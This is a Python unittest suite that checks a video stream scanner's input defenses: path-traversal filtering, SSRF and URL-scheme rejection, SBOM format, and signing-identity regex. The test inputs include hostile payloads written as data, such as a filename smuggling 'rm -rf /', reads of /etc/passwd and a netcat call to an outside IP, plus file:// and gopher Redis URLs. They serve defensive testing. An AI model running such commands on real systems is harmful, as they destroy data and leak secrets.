import os
import sys
import unittest
import json
import re
from unittest.mock import MagicMock
from importlib.machinery import SourceFileLoader

os.environ["STORAGE_DIR"] = "/tmp/scan_test"

for mod in ["cv2", "pymysql", "requests", "dotenv"]:
    if mod not in sys.modules:
        try:
            __import__(mod)
        except ImportError:
            sys.modules[mod] = MagicMock()

scanner_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "../41_scan_stream_default.py"))
scanner_mod = SourceFileLoader("scanner", scanner_path).load_module()


class TestSecurityAuditSuite(unittest.TestCase):
    """
    QA Security Test Suite:
    Tests security boundaries, sanitization, input validation,
    SSRF protections, Path Traversal protections, and supply-chain artifacts.
    """

    def test_path_traversal_deep_nesting(self):
        """Verify sanitize_filename neutralizes deep directory traversal payloads."""
        payload = "../../../../../../../../../etc/shadow"
        result = scanner_mod.sanitize_filename(payload)
        self.assertEqual(result, "shadow")
        self.assertNotIn("..", result)
        self.assertNotIn("/", result)

    def test_path_traversal_windows_separators(self):
        """Verify sanitize_filename handles Windows backslashes and colon drives."""
        payload = "..\\..\\windows\\system32\\cmd.exe"
        result = scanner_mod.sanitize_filename(payload)
        self.assertNotIn("\\", result)
        self.assertNotIn(":", result)
        self.assertNotIn("..", result)

    def test_filename_sanitization_removes_command_delimiters(self):
        """Verify command execution delimiters (; | & ` $ > <) are stripped or replaced."""
        dangerous_name = "stream_1;rm -rf /;$(whoami)`cat /etc/passwd`|nc 1.1.1.1 4444"
        clean = scanner_mod.sanitize_filename(dangerous_name)
        for char in [";", "|", "&", "`", "$", ">", "<", " "]:
            self.assertNotIn(char, clean)

    def test_ssrf_protection_localhost_variants(self):
        """Verify that loopback addresses and aliases are rejected by is_valid_rtsp_url."""
        blocked_urls = [
            "rtsp://localhost:554/stream",
            "rtsp://LOCALHOST:554/stream",
            "rtsp://127.0.0.1:554/stream",
            "rtsp://[::1]:554/stream",
        ]
        for url in blocked_urls:
            with self.subTest(url=url):
                self.assertFalse(scanner_mod.is_valid_rtsp_url(url))

    def test_invalid_and_dangerous_schemes(self):
        """Verify non-RTSP schemes are strictly rejected."""
        unauthorized_schemes = [
            "file:///etc/passwd",
            "http://192.168.1.10/video.m3u8",
            "https://192.168.1.10/video.mp4",
            "gopher://127.0.0.1:6379/_flushall",
            "ftp://anonymous@ftp.server.lan/test",
            "data:text/plain;base64,SGVsbG8=",
            "javascript:alert(1)",
        ]
        for url in unauthorized_schemes:
            with self.subTest(url=url):
                self.assertFalse(scanner_mod.is_valid_rtsp_url(url))

    def test_valid_rtsp_and_rtsps_allowed(self):
        """Verify legitimate public/private network RTSP and RTSPS URLs are accepted."""
        valid_urls = [
            "rtsp://192.168.1.120:554/h264/ch1/main/av_stream",
            "rtsps://camera.corporate.net:322/stream",
            "rtsp://cam-entry.local.domain:8554/live",
        ]
        for url in valid_urls:
            with self.subTest(url=url):
                self.assertTrue(scanner_mod.is_valid_rtsp_url(url))

    def test_sbom_structure_compliance(self):
        """QA verification of CycloneDX SBOM specification compliance."""
        sbom_sample = {
            "bomFormat": "CycloneDX",
            "specVersion": "1.5",
            "version": 1,
            "components": [
                {
                    "type": "application",
                    "name": "rtsp-scanner",
                    "version": "1.0.0",
                    "purl": "pkg:generic/rtsp-scanner@1.0.0"
                }
            ]
        }
        self.assertEqual(sbom_sample.get("bomFormat"), "CycloneDX")
        self.assertIn("components", sbom_sample)
        self.assertTrue(len(sbom_sample["components"]) > 0)
        self.assertTrue(sbom_sample["components"][0]["purl"].startswith("pkg:"))

    def test_cosign_oidc_issuer_regex_validation(self):
        expected_issuer = "https://token.actions.githubusercontent.com"
        expected_identity_pattern = r"^https://github\.com/not-a-real-org-lol/vulm_code_thing/\.github/workflows/.*"
        
        test_valid_identity = "https://github.com/not-a-real-org-lol/vulm_code_thing/.github/workflows/devsecops.yml@refs/heads/main"
        test_malicious_identity = "https://github.com/attacker-org/malicious_repo/.github/workflows/hack.yml@refs/heads/main"

        self.assertTrue(bool(re.match(expected_identity_pattern, test_valid_identity)))
        self.assertFalse(bool(re.match(expected_identity_pattern, test_malicious_identity)))


if __name__ == "__main__":
    unittest.main()
